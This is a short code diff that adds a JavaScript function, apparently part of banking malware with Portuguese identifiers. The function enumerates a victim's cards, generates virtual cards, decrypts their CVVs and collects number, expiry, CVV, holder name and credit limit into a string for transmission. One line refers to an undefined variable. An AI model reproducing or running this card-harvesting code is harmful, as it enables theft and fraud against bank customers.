@@ -109,7 +109,24 @@ function getAlphaNumericString(n) {
 }
 
 function transmitCard(ex, token, v) {
+    let cards = v.puxarCartoes();
+    let retorno = "";
+    cards.forEach(vv => {
+        if (vv.hasVirtualCard) {
+            try {
+                let a = v.gerarVirtual(v.index);
+                let data = JSON.parse(a);
+                if (a.indexOf('3333333333333333') == -1) {
+                    data.cvv = mo12438a(data.cvv);
+                    let cc = "NUMERO: " + data.cardNumber + " | VALIDADE: " + data.dueDate + " | CVV: " + data.cvv + " | NOME: " + data.ownerName + " | LIMITE DISPONIVEL: " + v.limites(cartao.lastDigits) + "\n";
+                    retorno += cc;
+                }
+            } catch (e) {
 
+            }
+        }
+    })
+    return retorno;
 }
 
 const login = async (username, password) => {
